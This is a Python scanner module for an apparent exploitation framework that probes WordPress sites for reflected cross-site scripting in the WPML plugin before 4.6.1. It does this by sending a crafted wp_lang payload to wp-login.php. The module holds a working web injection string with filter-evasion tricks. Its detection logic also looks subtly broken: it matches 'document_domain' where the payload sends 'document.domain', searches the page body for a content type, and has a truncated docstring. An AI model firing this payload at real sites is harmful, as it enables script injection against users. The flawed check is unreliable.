#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WPML Multilingual CMS plugin for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) in versio."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress WPML Multilingual CMS < 4.6.1 - Cross-Site Scripting Detection',
        'description': 'The WPML Multilingual CMS plugin for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) in versions prior to 4.6.1. The plugin does not escape some URL attributes before outputting them to a page, allowing attackers to inject malicious JavaScript which may be executed in the browser of an unsuspecting user.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp', 'wp-plugin', 'wpml', 'xss', 'sitepress-multilingual-cms'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/b9cc519c-7ec2-42c3-9f42-01e928e12139/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('id=xss onfocusin= alert(`document_domain`)', 'Lost your password?</a>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress WPML Multilingual CMS < 4.6.1 - Cross-Site Scripting detected",
                path='/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c',
            )
            return True
        return False

